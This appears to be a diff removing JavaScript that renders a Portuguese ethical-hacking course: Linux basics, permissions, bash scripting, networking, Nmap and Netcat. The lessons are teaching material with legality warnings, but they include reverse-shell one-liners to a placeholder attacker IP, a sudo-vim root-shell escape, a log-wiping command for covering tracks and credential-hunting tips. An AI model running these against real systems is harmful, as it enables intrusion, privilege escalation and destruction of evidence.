-<span class="ck">echo</span> <span class="cs">"linha 1"</span> <span class="cf">></span>  a.txt        <span class="cm"># cria/SOBRESCREVE</span>
-<span class="ck">echo</span> <span class="cs">"linha 2"</span> <span class="cf">>></span> a.txt        <span class="cm"># ADICIONA ao fim</span>
-<span class="ck">cat</span> <span class="cv">a.txt</span>                      <span class="cm"># lê o conteúdo</span>
-<span class="ck">cat</span> <span class="cf">-n</span> <span class="cv">a.txt</span>                   <span class="cm"># com números de linha</span>
-<span class="ck">less</span> <span class="cv">ficheiro_grande.txt</span>       <span class="cm"># leitor paginado (q=sair)</span>
-<span class="ck">tail</span> <span class="cf">-f</span> <span class="cv">log.txt</span>               <span class="cm"># segue em tempo real!</span>`)+
-danger("⚠️","Operador > é destrutivo","O <code>></code> apaga o conteúdo anterior sem aviso. Usa <code>>></code> se queres adicionar.")
-)+
-
-sec(3,"cp, mv, rm — Manipular ficheiros",
-cb("bash",`<span class="ck">cp</span> <span class="cv">origem.txt destino.txt</span>         <span class="cm"># copia</span>
-<span class="ck">cp</span> <span class="cf">-r</span> <span class="cv">pasta1/ pasta2/</span>            <span class="cm"># copia pasta (recursivo)</span>
-<span class="ck">mv</span> <span class="cv">antigo.txt novo.txt</span>           <span class="cm"># renomeia</span>
-<span class="ck">mv</span> <span class="cv">notas.txt</span> <span class="cs">~/lab/</span>             <span class="cm"># move</span>
-<span class="ck">rm</span> <span class="cv">ficheiro.txt</span>                  <span class="cm"># apaga</span>
-<span class="ck">rm</span> <span class="cf">-rf</span> <span class="cv">pasta/</span>                   <span class="cm"># apaga tudo sem perguntar ← PERIGO</span>`)+
-danger("💀","Não há lixo no Linux","O <code>rm</code> apaga definitivamente — sem Ctrl+Z. <code>rm -rf /</code> pode destruir um sistema inteiro.")+
-hack("Após comprometer um sistema, hackers usam <code>rm -rf /var/log/*</code> para apagar rastros. Aprende onde estão os logs.")
-)+
-
-sec(4,"find — Procurar com poder cirúrgico",
-cb("bash",`<span class="ck">find</span> <span class="cv">.</span> <span class="cf">-name</span> <span class="cs">"*.txt"</span>              <span class="cm"># todos os .txt</span>
-<span class="ck">find</span> <span class="cv">/</span> <span class="cf">-type f -name</span> <span class="cs">"*.conf"</span>    <span class="cm"># configs no sistema</span>
-<span class="ck">find</span> <span class="cv">.</span> <span class="cf">-size +1M</span>                  <span class="cm"># ficheiros > 1MB</span>
-<span class="ck">find</span> <span class="cv">/</span> <span class="cf">-perm -4000 -type f</span> <span class="cs">2>/dev/null</span> <span class="cm"># SUID!</span>`)+
-hack("<code>find / -name '*.bak' -o -name '*.old' 2>/dev/null</code> encontra backups esquecidos com credenciais.")
-)+
-
-ex(`<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cs">~/lab/aula2/{textos,backups}</span>
-<span class="ck">echo</span> <span class="cs">"Ficheiro A"</span> <span class="cf">></span> <span class="cs">~/lab/aula2/textos/a.txt</span>
-<span class="ck">echo</span> <span class="cs">"Linha 2"</span> <span class="cf">>></span> <span class="cs">~/lab/aula2/textos/a.txt</span>
-<span class="ck">cat</span> <span class="cs">~/lab/aula2/textos/a.txt</span>
-<span class="ck">cp</span> <span class="cs">~/lab/aula2/textos/a.txt</span> <span class="cs">~/lab/aula2/backups/</span>
-<span class="ck">find</span> <span class="cs">~/lab/aula2/</span> <span class="cf">-name</span> <span class="cs">"*.txt"</span>`)
-}
-
-function buildLesson2(){
-return`<div class="lesson-eyebrow">Módulo 1 · Aula 3 de 6</div>
-<h1 class="lesson-h1">Permissões, utilizadores e grupos</h1>
-<div class="lesson-desc">Permissões são o coração da segurança Linux. Quase todos os privilege escalation attacks existem porque alguém configurou permissões erradas.</div>`+
-
-sec(1,"Identidade no Linux",
-cb("bash",`<span class="ck">whoami</span>        <span class="cm"># quem sou?</span>
-<span class="ck">id</span>            <span class="cm"># uid, gid e grupos</span>
-<span class="ck">groups</span>        <span class="cm"># grupos a que pertenço</span>
-<span class="ck">cat</span> /etc/passwd <span class="cm"># todos os utilizadores</span>`)+
-tbl(["UID Range","Tipo"],
-[["0","root (superutilizador)"],
-["1–99","Utilizadores de sistema"],
-["1000+","Utilizadores humanos normais"]])
-)+
-
-sec(2,"Ler permissões — rwx em detalhe",
-cb("estrutura",`<span class="ck">-</span>  <span class="cf">rw-</span>  <span class="cv">r--</span>  <span class="cs">r--</span>
-<span class="co">│    │    │    └── Others: r--</span>
-<span class="co">│    │    └────── Group:  r--</span>
-<span class="co">│    └─────────── User:   rw-</span>
-<span class="co">└──────────────── Tipo: - ficheiro, d pasta, l link</span>`,false)+
-tbl(["Letra","Permissão","Num pasta"],
-[["<code>r</code>","ler","listar (ls)"],
-["<code>w</code>","escrever","criar/apagar dentro"],
-["<code>x</code>","executar","entrar (cd)"],
-["<code>-</code>","sem permissão","—"]])+
-tryit("ls -la /etc/passwd, ls -la /tmp", "l2a")
-)+
-
-sec(3,"chmod — Modo Octal (profissional)",
-cb("bash",`<span class="cm"># r=4, w=2, x=1  →  rwx=7, rw-=6, r-x=5, r--=4</span>
-<span class="ck">chmod</span> <span class="cf">755</span> <span class="cv">script.sh</span>   <span class="cm"># rwxr-xr-x (executável público)</span>
-<span class="ck">chmod</span> <span class="cf">644</span> <span class="cv">notas.txt</span>   <span class="cm"># rw-r--r-- (ficheiro normal)</span>
-<span class="ck">chmod</span> <span class="cf">600</span> <span class="cv">chave.pem</span>   <span class="cm"># rw------- (chave SSH!)</span>
-<span class="ck">chmod</span> <span class="cf">700</span> <span class="cv">privado.sh</span>  <span class="cm"># rwx------ (só o dono)</span>
-<span class="cm"># Simbólico:</span>
-<span class="ck">chmod</span> <span class="cf">u+x</span> <span class="cv">script.sh</span>  <span class="cm"># adiciona execução ao dono</span>
-<span class="ck">chmod</span> <span class="cf">o-rwx</span> <span class="cv">segredo</span>  <span class="cm"># remove tudo dos outros</span>`)
-)+
-
-sec(4,"SUID — o vector de ataque",
-cb("bash",`<span class="cm"># SUID: corre com privilégios do DONO, não de quem executa</span>
-<span class="ck">ls</span> <span class="cf">-la</span> /usr/bin/passwd
-<span class="cm"># -rwsr-xr-x ... root ... passwd</span>
-<span class="cm">#      ^ 's' = SUID activo</span>
-
-<span class="cm"># Encontrar todos os SUID de root:</span>
-<span class="ck">find</span> / <span class="cf">-perm -4000 -user root -type f</span> <span class="cs">2>/dev/null</span>`)+
-danger("🎯","SUID = vector de ataque crítico","Binários SUID pertencentes a root são alvos de privilege escalation. Verifica em gtfobins.github.io.")
-)+
-
-sec(5,"sudo e /etc/passwd",
-cb("bash",`<span class="ck">sudo</span> <span class="cf">-l</span>                <span class="cm"># o que posso fazer com sudo?</span>
-<span class="ck">sudo</span> <span class="cv">comando</span>           <span class="cm"># executa como root</span>
-<span class="ck">cat</span> /etc/passwd        <span class="cm"># utilizadores do sistema</span>
-<span class="cm"># dawn:x:1000:1000::/home/dawn:/bin/bash</span>
-<span class="cm">#  1   2   3    4        5         6</span>
-<span class="cm"># 1=user 2=pass(em shadow) 3=uid 4=gid 5=home 6=shell</span>`)+
-hack("<code>sudo -l</code> é um dos primeiros comandos após acesso. <code>NOPASSWD: /usr/bin/vim</code> → <code>sudo vim -c ':!/bin/bash'</code> = shell root.")
-)+
-
-ex(`<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cs">~/lab/aula3/{publ,priv,scripts}</span>
-<span class="ck">echo</span> <span class="cs">"público"</span> <span class="cf">></span> <span class="cs">~/lab/aula3/publ/readme.txt</span>
-<span class="ck">echo</span> <span class="cs">"secreto"</span> <span class="cf">></span> <span class="cs">~/lab/aula3/priv/secret.txt</span>
-<span class="ck">chmod</span> <span class="cf">644</span> <span class="cs">~/lab/aula3/publ/readme.txt</span>
-<span class="ck">chmod</span> <span class="cf">600</span> <span class="cs">~/lab/aula3/priv/secret.txt</span>
-<span class="ck">ls</span> <span class="cf">-la</span> <span class="cs">~/lab/aula3/</span>
-<span class="ck">id</span>
-<span class="ck">find</span> / <span class="cf">-perm -4000 -type f</span> <span class="cs">2>/dev/null</span>`)
-}
-
-function buildLesson3(){
-return`<div class="lesson-eyebrow">Módulo 1 · Aula 4 de 6</div>
-<h1 class="lesson-h1">Processos, pipes e redirecionamento</h1>
-<div class="lesson-desc">Processos são tudo o que corre no sistema. Pipes e redirecionamento são as ferramentas que transformam comandos simples em pipelines de análise poderosos.</div>`+
-
-sec(1,"Processos — o que está a correr",
-cb("bash",`<span class="ck">ps aux</span>                  <span class="cm"># TODOS os processos</span>
-<span class="ck">ps aux</span> | <span class="ck">grep</span> <span class="cv">apache</span>   <span class="cm"># filtra por nome</span>
-<span class="ck">ps -ef --forest</span>         <span class="cm"># árvore de processos</span>
-<span class="ck">top</span>                     <span class="cm"># monitor tempo real</span>
-<span class="ck">kill</span> <span class="cf">-9</span> <span class="cv">1234</span>           <span class="cm"># força morte do PID 1234</span>
-<span class="ck">killall</span> <span class="cv">firefox</span>        <span class="cm"># mata todos os "firefox"</span>`)+
-hack("Árvore de processos (<code>ps -ef --forest</code>) revela como um sistema foi comprometido. apache2 → bash = webshell!")
-)+
-
-sec(2,"Standard Streams e Redirecionamento",
-cb("bash",`<span class="cm"># stdin(0) stdout(1) stderr(2)</span>
-<span class="ck">ls</span> <span class="cf">-la</span> <span class="cf">></span>  output.txt          <span class="cm"># guarda stdout (sobrescreve)</span>
-<span class="ck">ls</span> <span class="cf">-la</span> <span class="cf">>></span> output.txt          <span class="cm"># guarda stdout (append)</span>
-<span class="ck">nmap</span> <span class="cv">target</span> <span class="cs">2>/dev/null</span>      <span class="cm"># descarta erros</span>
-<span class="ck">nmap</span> <span class="cv">target</span> <span class="cf">&></span> tudo.txt       <span class="cm"># stdout + stderr`)+
-tip("🕳️","/dev/null","Buraco negro — tudo o que é enviado para lá desaparece. Usado para silenciar erros irrelevantes.")
-)+
-
-sec(3,"O Pipe | — encadear comandos",
-cb("bash",`<span class="ck">ps aux</span> | <span class="ck">grep</span> <span class="cv">root</span>              <span class="cm"># processos de root</span>
-<span class="ck">ps aux</span> | <span class="ck">wc</span> <span class="cf">-l</span>                  <span class="cm"># quantos processos?</span>
-<span class="ck">cat</span> /etc/passwd | <span class="ck">cut</span> <span class="cf">-d:</span> <span class="cf">-f1</span>  <span class="cm"># extrai usernames</span>`)+
-tryit("ps aux | wc -l, cat /etc/passwd | cut -d: -f1", "l3a")
-)+
-
-sec(4,"grep, awk, sed — arsenal de texto",
-cb("bash",`<span class="ck">grep</span> <span class="cf">-r</span> <span class="cs">"password"</span> /etc/       <span class="cm"># recon real!</span>
-<span class="ck">grep</span> <span class="cf">-i</span> <span class="cs">"root"</span> /etc/passwd     <span class="cm"># case-insensitive</span>
-<span class="ck">awk</span> <span class="cf">-F:</span> <span class="cs">'{print $1,$7}'</span> /etc/passwd <span class="cm"># user:shell</span>
-<span class="ck">sed</span> <span class="cs">'s/antigo/novo/g'</span> <span class="cv">f.txt</span>    <span class="cm"># substituição global</span>
-<span class="ck">sort</span> | <span class="ck">uniq</span> <span class="cf">-c</span>               <span class="cm"># conta ocorrências únicas</span>
-<span class="ck">cat</span> log | <span class="ck">awk</span> <span class="cs">'{print $1}'</span> | <span class="ck">sort</span> | <span class="ck">uniq</span> <span class="cf">-c</span> | <span class="ck">sort</span> <span class="cf">-rn</span> | <span class="ck">head</span> <span class="cf">-10</span>`)
-)+
-
-ex(`<span class="ck">ps aux</span> | <span class="ck">wc</span> <span class="cf">-l</span>
-<span class="ck">ps aux</span> | <span class="ck">grep</span> <span class="cs">$(whoami)</span>
-<span class="ck">cat</span> /etc/passwd | <span class="ck">cut</span> <span class="cf">-d:</span> <span class="cf">-f1</span>
-<span class="ck">cat</span> /etc/passwd | <span class="ck">awk</span> <span class="cf">-F:</span> <span class="cs">'{print $1,$7}'</span> | <span class="ck">sort</span>
-<span class="ck">find</span> / <span class="cf">-perm -4000 -type f</span> <span class="cs">2>/dev/null</span> | <span class="ck">tee</span> <span class="cs">~/lab/suid.txt</span>`)
-}
-
-function buildLesson4(){
-return`<div class="lesson-eyebrow">Módulo 1 · Aula 5 de 6</div>
-<h1 class="lesson-h1">Variáveis de ambiente e .bashrc</h1>
-<div class="lesson-desc">O ambiente do shell define a tua identidade operacional. PATH hijacking é um vector de ataque real, e .bashrc é o primeiro ficheiro que persiste após acesso.</div>`+
-
-sec(1,"Variáveis especiais",
-cb("bash",`<span class="ck">echo</span> <span class="cs">$HOME</span>    <span class="cm"># pasta home</span>
-<span class="ck">echo</span> <span class="cs">$PATH</span>    <span class="cm"># onde o bash procura binários</span>
-<span class="ck">echo</span> <span class="cs">$USER</span>    <span class="cm"># nome do utilizador</span>
-<span class="ck">echo</span> <span class="cs">$?</span>       <span class="cm"># exit code do último comando (0=sucesso)</span>
-<span class="ck">echo</span> <span class="cs">$$</span>       <span class="cm"># PID do shell actual</span>
-<span class="ck">env</span>           <span class="cm"># TODAS as variáveis de ambiente</span>`)+
-hack("Após obter shell, <code>env</code> pode revelar <code>DB_PASS=secret</code>, IPs internos ou paths de ferramentas sensíveis.")
-)+
-
-sec(2,"Criar e exportar variáveis",
-cb("bash",`<span class="cv">NOME</span>=<span class="cs">"dawn"</span>           <span class="cm"># variável local</span>
-<span class="ck">export</span> <span class="cv">TARGET</span>=<span class="cs">"10.10.10.1"</span>
-<span class="ck">nmap</span> <span class="cs">$TARGET</span>         <span class="cm"># usa a variável</span>
-<span class="ck">export</span> <span class="cv">RHOST</span>=<span class="cs">"10.10.10.5"</span>   <span class="cm"># alvo</span>
-<span class="ck">export</span> <span class="cv">LHOST</span>=<span class="cs">"10.10.14.1"</span>   <span class="cm"># a tua máquina</span>
-<span class="ck">export</span> <span class="cv">LPORT</span>=<span class="cs">"4444"</span>         <span class="cm"># porta de escuta</span>`)+
-warn("⚠️","Sem espaços no =","<code>VAR = valor</code> dá erro. É sempre <code>VAR=valor</code> sem espaços.")
-)+
-
-sec(3,".bashrc — configuração persistente",
-cb("bash",`<span class="ck">cat</span> <span class="cs">~/.bashrc</span>           <span class="cm"># ver configuração actual</span>
-<span class="ck">nano</span> <span class="cs">~/.bashrc</span>          <span class="cm"># editar</span>
-<span class="ck">source</span> <span class="cs">~/.bashrc</span>        <span class="cm"># recarregar sem fechar terminal</span>
-
-<span class="cm"># Conteúdo útil para hacking:</span>
-<span class="ck">alias</span> <span class="cv">ll</span>=<span class="cs">'ls -lah'</span>
-<span class="ck">alias</span> <span class="cv">ports</span>=<span class="cs">'ss -tlnp'</span>
-<span class="ck">alias</span> <span class="cv">suid</span>=<span class="cs">'find / -perm -4000 -type f 2>/dev/null'</span>
-<span class="ck">export</span> <span class="cv">PATH</span>=<span class="cs">"$PATH:~/tools:~/scripts"</span>`)
-)+
-
-ex(`<span class="ck">echo</span> <span class="cs">$HOME</span>
-<span class="ck">echo</span> <span class="cs">$PATH</span>
-<span class="ck">export</span> <span class="cv">TARGET</span>=<span class="cs">"scanme.nmap.org"</span>
-<span class="ck">echo</span> <span class="cs">"Alvo: $TARGET"</span>
-<span class="ck">echo</span> <span class="cs">"alias ll='ls -lah'"</span> <span class="cf">>></span> <span class="cs">~/.bashrc</span>
-<span class="ck">source</span> <span class="cs">~/.bashrc</span>
-<span class="ck">alias</span>`)
-}
-
-function buildLesson5(){
-return`<div class="lesson-eyebrow">Módulo 1 · Aula 6 de 6</div>
-<h1 class="lesson-h1">Bash Scripting — automação e poder</h1>
-<div class="lesson-desc">Scripting bash é o que separa quem usa ferramentas de quem as constrói. Em hacking ético, scripts automatizam reconhecimento, enumeração e pós-exploração.</div>`+
-
-sec(1,"Estrutura base de um script",
-cb("bash",`<span class="ck">#!/bin/bash</span>
-<span class="cm"># Shebang: diz qual interpretador usar — SEMPRE na 1ª linha</span>
-
-<span class="cm"># Tornar executável e correr:</span>
-<span class="ck">chmod</span> <span class="cf">+x</span> <span class="cv">script.sh</span>
-<span class="ck">./script.sh</span>`)
-)+
-
-sec(2,"Variáveis, arrays e aritmética",
-cb("bash",`<span class="cv">NOME</span>=<span class="cs">"TermuxLab"</span>
-<span class="cv">ARRAY</span>=<span class="cs">(item1 item2 item3)</span>
-<span class="ck">echo</span> <span class="cs">"${ARRAY[0]}"</span>     <span class="cm"># primeiro item</span>
-<span class="ck">echo</span> <span class="cs">"${#ARRAY[@]}"</span>    <span class="cm"># número de itens</span>
-<span class="cv">SOMA</span>=<span class="cs">$((10 + 5 * 3))</span>   <span class="cm"># aritmética</span>
-<span class="ck">echo</span> <span class="cs">"Resultado: $SOMA"</span>`)
-)+
-
-sec(3,"Condicionais e loops",
-cb("bash",`<span class="ck">if</span> <span class="cf">[ "$USER" = "root" ]</span>; <span class="ck">then</span>
-  <span class="ck">echo</span> <span class="cs">"root detectado!"</span>
-<span class="ck">elif</span> <span class="cf">[ $# -lt 1 ]</span>; <span class="ck">then</span>
-  <span class="ck">echo</span> <span class="cs">"Uso: $0 &lt;IP&gt;"</span>; <span class="ck">exit</span> <span class="cf">1</span>
-<span class="ck">fi</span>
-
-<span class="ck">for</span> <span class="cv">i</span> <span class="ck">in</span> <span class="cs">{1..10}</span>; <span class="ck">do</span>
-  <span class="ck">echo</span> <span class="cs">"Linha $i"</span>
-<span class="ck">done</span>
-
-<span class="ck">while</span> <span class="ck">IFS</span>= <span class="ck">read</span> <span class="cf">-r</span> <span class="cv">linha</span>; <span class="ck">do</span>
-  <span class="ck">echo</span> <span class="cs">"$linha"</span>
-<span class="ck">done</span> < wordlist.txt`)
-)+
-
-sec(4,"Script real — Port Scanner bash puro",
-cb("bash",`<span class="ck">#!/bin/bash</span>
-<span class="ck">if</span> <span class="cf">[ $# -lt 1 ]</span>; <span class="ck">then</span> <span class="ck">echo</span> <span class="cs">"Uso: $0 &lt;IP&gt;"</span>; <span class="ck">exit</span> <span class="cf">1</span>; <span class="ck">fi</span>
-<span class="cv">TARGET</span>=<span class="cs">$1</span>
-<span class="ck">echo</span> <span class="cs">"[*] Scanning $TARGET..."</span>
-<span class="ck">for</span> <span class="cv">PORTA</span> <span class="ck">in</span> <span class="cs">21 22 23 25 80 443 445 3306 3389</span>; <span class="ck">do</span>
-  <span class="co">(echo >/dev/tcp/$TARGET/$PORTA) &>/dev/null && {</span>
-    <span class="ck">echo</span> <span class="cs">"[+] Porta $PORTA ABERTA"</span>
-  <span class="co">}</span>
-<span class="ck">done</span>`)
-)+
-
-ex(`<span class="ck">mkdir</span> <span class="cf">-p</span> <span class="cs">~/lab/scripts</span>
-<span class="ck">cat</span> <span class="cf">></span> <span class="cs">~/lab/scripts/hello.sh</span> << <span class="cs">'EOF'</span>
-#!/bin/bash
-echo "=== TermuxLab Script ==="
-echo "Utilizador: $(whoami)"
-echo "Data: $(date)"
-echo "Processos: $(ps aux | wc -l)"
-<span class="cs">EOF</span>
-<span class="ck">chmod</span> <span class="cf">+x</span> <span class="cs">~/lab/scripts/hello.sh</span>
-<span class="ck">~/lab/scripts/hello.sh</span>`)
-}
-
-function buildLesson6(){
-return`<div class="lesson-eyebrow">Módulo 2 · Redes</div>
-<h1 class="lesson-h1">Modelo OSI, TCP/IP e protocolos</h1>
-<div class="lesson-desc">Antes de atacar ou defender, precisas de entender como os dados viajam. O modelo OSI não é teoria abstracta — é o mapa que diz onde cada ataque actua.</div>`+
-
-sec(1,"Modelo OSI vs TCP/IP",
-cb("modelo",`<span class="cm"># OSI — 7 camadas</span>
-<span class="co">7 Aplicação   → HTTP, DNS, FTP, SMTP, SSH</span>
-<span class="co">6 Apresentação→ TLS/SSL, codificação</span>
-<span class="co">5 Sessão      → gestão de sessões</span>
-<span class="co">4 Transporte  → TCP, UDP — PORTAS</span>
-<span class="co">3 Rede        → IP, ICMP, routing</span>
-<span class="co">2 Ligação     → Ethernet, Wi-Fi, MAC</span>
-<span class="co">1 Física      → cabos, sinais, rádio</span>`,false)+
-tbl(["Camada","Ataques típicos"],
-[["7 Aplicação","SQLi, XSS, Command Injection"],
-["4 Transporte","Port scan, SYN flood"],
-["3 Rede","IP spoofing, ICMP flood"],
-["2 Ligação","ARP poisoning, MAC flooding"]])
-)+
-
-sec(2,"TCP 3-way Handshake",
-cb("tcp",`<span class="co">Cliente                Servidor</span>
-<span class="ck">  │── SYN ────────────→ │</span>  <span class="cm">"Quero conectar"</span>
-<span class="cv">  │← SYN-ACK ────────── │</span>  <span class="cm">"OK, e eu?"</span>
-<span class="ck">  │── ACK ────────────→ │</span>  <span class="cm">"Confirmado"</span>
-<span class="co">  │══ CONEXÃO ACTIVA ══ │</span>`,false)+
-hack("Nmap SYN scan (<code>-sS</code>) envia SYN, recebe SYN-ACK mas nunca completa o handshake. Mais furtivo que TCP connect scan.")
-)+
-
-sec(3,"Portas — o que cada número significa",
-cb("portas",`<span class="co">22   TCP → SSH       445  TCP → SMB</span>
-<span class="co">23   TCP → Telnet    3306 TCP → MySQL</span>
-<span class="co">25   TCP → SMTP      3389 TCP → RDP</span>
-<span class="co">53  UDP  → DNS       5432 TCP → PostgreSQL</span>
-<span class="co">80   TCP → HTTP      6379 TCP → Redis</span>
-<span class="co">443  TCP → HTTPS    27017 TCP → MongoDB</span>`,false)+
-hack("Portas abertas = pontos de entrada. SSH(22) → credenciais fracas. SMB(445) → EternalBlue. RDP(3389) → BlueKeep.")
-)+
-
-ex(`<span class="ck">pkg install</span> <span class="cv">iproute2 dnsutils curl</span>
-<span class="ck">ip addr show</span>
-<span class="ck">ss</span> <span class="cf">-tlnp</span>
-<span class="ck">ping</span> <span class="cf">-c 3</span> <span class="cv">8.8.8.8</span>
-<span class="ck">curl</span> <span class="cv">ifconfig.me</span>`)
-}
-
-function buildLesson7(){
-return`<div class="lesson-eyebrow">Módulo 2 · Redes</div>
-<h1 class="lesson-h1">IP, Subnetting, DNS e HTTP</h1>
-<div class="lesson-desc">Endereçamento IP, resolução DNS e HTTP são os três pilares da internet. DNS recon pode revelar subdomínios ocultos; entender HTTP é obrigatório para web pentesting.</div>`+
-
-sec(1,"IPv4 e CIDR",
-cb("rede",`<span class="co">Endereços privados (RFC 1918):</span>
-<span class="cv">10.0.0.0/8</span>         <span class="cm">→ 10.x.x.x</span>
-<span class="cv">172.16.0.0/12</span>      <span class="cm">→ 172.16-31.x.x</span>
-<span class="cv">192.168.0.0/16</span>     <span class="cm">→ 192.168.x.x</span>
-
-<span class="co">CIDR:</span>
-<span class="co">/24 → 254 hosts, máscara 255.255.255.0</span>
-<span class="co">/16 → 65534 hosts</span>
-<span class="co">/8  → ~16 milhões de hosts</span>`,false)
-)+
-
-sec(2,"DNS — resolução e recon",
-cb("bash",`<span class="ck">nslookup</span> <span class="cv">google.com</span>
-<span class="ck">dig</span> <span class="cv">google.com</span>           <span class="cm"># lookup completo</span>
-<span class="ck">dig</span> <span class="cv">google.com MX</span>        <span class="cm"># servidores de email</span>
-<span class="ck">dig</span> <span class="cv">google.com NS</span>        <span class="cm"># nameservers</span>
-<span class="ck">dig</span> <span class="cf">-x</span> <span class="cv">8.8.8.8</span>           <span class="cm"># reverse lookup</span>`)+
-hack("Zone transfer: <code>dig axfr @ns1.domain.com domain.com</code> — se mal configurado, revela TODOS os hosts do domínio.")
-)+
-
-sec(3,"HTTP com curl",
-cb("bash",`<span class="ck">curl</span> <span class="cf">-I</span> <span class="cv">https://site.com</span>           <span class="cm"># só cabeçalhos</span>
-<span class="ck">curl</span> <span class="cf">-v</span> <span class="cv">https://site.com</span>           <span class="cm"># verbose completo</span>
-<span class="ck">curl</span> <span class="cf">-X POST -d</span> <span class="cs">'user=a&pass=b'</span> <span class="cv">URL</span>
-<span class="ck">curl</span> <span class="cf">-k</span> <span class="cv">https://self-signed.site</span>   <span class="cm"># ignora cert inválido</span>
-<span class="ck">curl</span> <span class="cf">-A</span> <span class="cs">"Mozilla/5.0"</span> <span class="cv">URL</span>          <span class="cm"># User-Agent falso</span>`)+
-hack("<code>curl -I</code> revela <code>Server: Apache/2.4.52</code> e <code>X-Powered-By: PHP/7.4</code> — verifica no CVE database.")
-)+
-
-ex(`<span class="ck">dig</span> <span class="cv">nmap.org</span>
-<span class="ck">dig</span> <span class="cv">nmap.org MX</span>
-<span class="ck">curl</span> <span class="cf">-I</span> <span class="cv">https://nmap.org</span>
-<span class="ck">ip addr show</span>
-<span class="ck">ip route show</span>`)
-}
-
-function buildLesson8(){
-return`<div class="lesson-eyebrow">Módulo 2 · Redes</div>
-<h1 class="lesson-h1">Nmap — reconhecimento de redes</h1>
-<div class="lesson-desc">Nmap é a ferramenta de reconhecimento de redes mais usada no mundo. O alvo de prática oficial é scanme.nmap.org — podes escanear legalmente.</div>`+
-danger("⚖️","Só scan em alvos autorizados","Usar Nmap sem permissão é ilegal. Usa sempre scanme.nmap.org, a tua rede, ou HackTheBox/TryHackMe.")+
-
-sec(1,"Tipos de scan",
-cb("bash",`<span class="ck">nmap</span> <span class="cf">-sS</span> <span class="cv">target</span>  <span class="cm"># SYN scan (stealth) ← mais usado</span>
-<span class="ck">nmap</span> <span class="cf">-sT</span> <span class="cv">target</span>  <span class="cm"># TCP connect (sem root)</span>
-<span class="ck">nmap</span> <span class="cf">-sU</span> <span class="cv">target</span>  <span class="cm"># UDP scan (lento)</span>
-<span class="ck">nmap</span> <span class="cf">-sn</span> <span class="cv">target</span>  <span class="cm"># ping scan (hosts vivos)</span>`)
-)+
-
-sec(2,"Portas e versões",
-cb("bash",`<span class="ck">nmap</span> <span class="cf">-p 80,443</span> <span class="cv">target</span>       <span class="cm"># portas específicas</span>
-<span class="ck">nmap</span> <span class="cf">-p-</span> <span class="cv">target</span>              <span class="cm"># TODAS as 65535 portas</span>
-<span class="ck">nmap</span> <span class="cf">-F</span> <span class="cv">target</span>               <span class="cm"># fast: top 100</span>
-<span class="ck">nmap</span> <span class="cf">-sV</span> <span class="cv">target</span>              <span class="cm"># versão dos serviços</span>
-<span class="ck">nmap</span> <span class="cf">-sV -sC</span> <span class="cv">target</span>         <span class="cm"># + scripts default</span>
-<span class="ck">nmap</span> <span class="cf">-A</span> <span class="cv">target</span>               <span class="cm"># tudo: versão+OS+scripts</span>`)
-)+
-
-sec(3,"Timing e output",
-cb("bash",`<span class="co">-T0 paranoid  -T1 sneaky  -T2 polite</span>
-<span class="co">-T3 normal    -T4 aggressive (CTF)  -T5 insane</span>
-
-<span class="ck">nmap</span> <span class="cf">-T4 --min-rate 1000</span> <span class="cv">target</span>    <span class="cm"># rápido</span>
-<span class="ck">nmap</span> <span class="cf">-oN</span> <span class="cv">scan.txt</span> <span class="cv">target</span>          <span class="cm"># guarda output</span>
-<span class="ck">nmap</span> <span class="cf">-oA</span> <span class="cv">scan</span> <span class="cv">target</span>              <span class="cm"># todos os formatos</span>`)
-)+
-
-sec(4,"NSE Scripts",
-cb("bash",`<span class="ck">nmap</span> <span class="cf">--script vuln</span> <span class="cv">target</span>                 <span class="cm"># vulnerabilidades</span>
-<span class="ck">nmap</span> <span class="cf">--script</span> <span class="cv">http-title -p 80</span> <span class="cv">target</span>    <span class="cm"># título web</span>
-<span class="ck">nmap</span> <span class="cf">--script</span> <span class="cv">smb-vuln-ms17-010</span> <span class="cv">target</span>  <span class="cm"># EternalBlue</span>
-<span class="ck">nmap</span> <span class="cf">--script</span> <span class="cv">ftp-anon -p 21</span> <span class="cv">target</span>    <span class="cm"># FTP anónimo</span>`)
-)+
-
-ex(`<span class="ck">pkg install</span> <span class="cv">nmap</span>
-<span class="ck">nmap</span> <span class="cf">-sV -sC</span> <span class="cv">scanme.nmap.org</span>
-<span class="ck">nmap</span> <span class="cf">-p 80</span> <span class="cf">--script</span> <span class="cv">http-title</span> <span class="cv">scanme.nmap.org</span>
-<span class="ck">nmap</span> <span class="cf">-F -T4</span> <span class="cv">scanme.nmap.org</span> <span class="cf">-oN</span> <span class="cs">~/lab/scan.txt</span>`)
-}
-
-function buildLesson9(){
-return`<div class="lesson-eyebrow">Módulo 2 · Redes</div>
-<h1 class="lesson-h1">Netcat e reconhecimento de serviços</h1>
-<div class="lesson-desc">Netcat é chamado o canivete suíço da rede. Ligações TCP/UDP, transferir ficheiros, banner grabbing, e a base de shells remotas.</div>`+
-
-sec(1,"Netcat — banner grabbing",
-cb("bash",`<span class="ck">pkg install</span> <span class="cv">netcat-openbsd</span>
-
-<span class="ck">echo</span> <span class="cf">""</span> | <span class="ck">nc</span> <span class="cf">-w 3</span> <span class="cv">target.com</span> <span class="cf">22</span>   <span class="cm"># SSH banner</span>
-<span class="ck">echo</span> <span class="cf">""</span> | <span class="ck">nc</span> <span class="cf">-w 3</span> <span class="cv">target.com</span> <span class="cf">21</span>   <span class="cm"># FTP banner</span>
-<span class="ck">echo</span> <span class="cf">""</span> | <span class="ck">nc</span> <span class="cf">-w 3</span> <span class="cv">target.com</span> <span class="cf">25</span>   <span class="cm"># SMTP banner</span>
-<span class="ck">nmap</span> <span class="cf">--script=banner</span> <span class="cv">target</span>        <span class="cm"># via nmap</span>`)
-)+
-
-sec(2,"Reverse Shell — o conceito fundamental",
-cb("bash",`<span class="cm"># Atacante (fica à escuta):</span>
-<span class="ck">nc</span> <span class="cf">-lvnp</span> <span class="cf">4444</span>
-
-<span class="cm"># Vítima (envia shell):</span>
-<span class="ck">nc</span> <span class="cv">IP_ATACANTE</span> <span class="cf">4444</span> <span class="cf">-e</span> /bin/bash
-
-<span class="cm"># Versão sem -e (mais compatível):</span>
-<span class="ck">mkfifo</span> /tmp/f; <span class="ck">cat</span> /tmp/f | /bin/bash <span class="cf">-i</span> <span class="cs">2>&1</span> | <span class="ck">nc</span> <span class="cv">IP</span> <span class="cf">4444</span> <span class="cf">></span> /tmp/f`)+
-danger("⚖️","Uso ético apenas","Shells reversas são técnicas legítimas em pentest autorizado. Sem autorização = crime.")
-)+
-
-ex(`<span class="ck">pkg install</span> <span class="cv">netcat-openbsd nmap</span>
